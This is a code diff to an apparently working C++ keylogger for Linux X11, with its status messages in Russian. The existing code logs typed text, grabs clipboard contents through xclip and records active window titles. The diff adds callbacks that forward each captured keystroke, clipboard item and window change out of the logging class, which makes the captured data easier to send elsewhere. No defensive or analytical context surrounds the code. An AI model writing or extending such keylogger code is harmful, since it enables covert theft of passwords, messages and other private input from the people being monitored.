@@ -1,6 +1,7 @@
 #include "application.hpp"
 #include <iostream>
 #include <stdexcept>
+#include <functional>
 
 #include "../utils/common/common.hpp"
 #include "../utils/windowTrackingHelper/windowTracking.hpp"
@@ -10,6 +11,12 @@ Application::Application() : keyboardHandler_(nullptr) {
     keyboardHandler_ = KeyboardEventHandler(display_);
     std::cout << "Пассивный перехват запущен. Нажимайте клавиши..." << std::endl;
     std::cout << "Нажмите Escape для выхода." << std::endl;
+}
+
+Application::Application(WindowChangeCallback onWindowChange, KeyPressCallback onKeyPress) 
+    : keyboardHandler_(nullptr), onWindowChange_(onWindowChange), onKeyPress_(onKeyPress) {
+    initializeX11();
+    keyboardHandler_ = KeyboardEventHandler(display_);
 }
 
 Application::~Application() {
@@ -51,6 +58,10 @@ void Application::run() {
     }
 }
 
+void Application::stop() {
+    isRunning_ = false;
+}
+
 void Application::processEvents() {
     XEvent xevent;
     XNextEvent(display_, &xevent);
@@ -77,7 +88,12 @@ void Application::updateActiveWindow() {
     std::string newWindowName = windowTracking(display_);
     if (newWindowName != currentWindowName_ && !newWindowName.empty()) {
         currentWindowName_ = newWindowName;
-        logBuffer_ += "\n\n\n" + getCurrentTimestamp() + " - [Active Window: " + currentWindowName_ + "]\n\n"; 
+        std::string time = getCurrentTimestamp();
+        logBuffer_ += "\n\n\n" + time + " - [Active Window: " + currentWindowName_ + "]\n\n";
+        
+        if (onWindowChange_) {
+            onWindowChange_(currentWindowName_, time);
+        }
     }
 }
 
@@ -94,7 +110,9 @@ void Application::handleAction(const ProcessedEvent& result) {
         case KeyboardAction::CAPTURE_CLIPBOARD: {
             std::string clipboard_text = exec("xclip -selection clipboard -o");
             std::cout << "Copied: " << clipboard_text << std::endl;
-            logBuffer_ += "\n\n" + getCurrentTimestamp() + " - Copied:[\n" + clipboard_text + "\n]\n";
+            std::string logMsg = "\n\n" + getCurrentTimestamp() + " - Copied:[\n" + clipboard_text + "\n]\n";
+            logBuffer_ += logMsg;
+            if (onKeyPress_) onKeyPress_("[Clipboard: " + clipboard_text + "]");
             break;
         }
 
@@ -110,6 +128,7 @@ void Application::handleAction(const ProcessedEvent& result) {
 
         case KeyboardAction::LOG_TEXT:
             logBuffer_ += result.text_to_log;
+            if (onKeyPress_) onKeyPress_(result.text_to_log);
             break;
 
         case KeyboardAction::HANDLE_BACKSPACE:
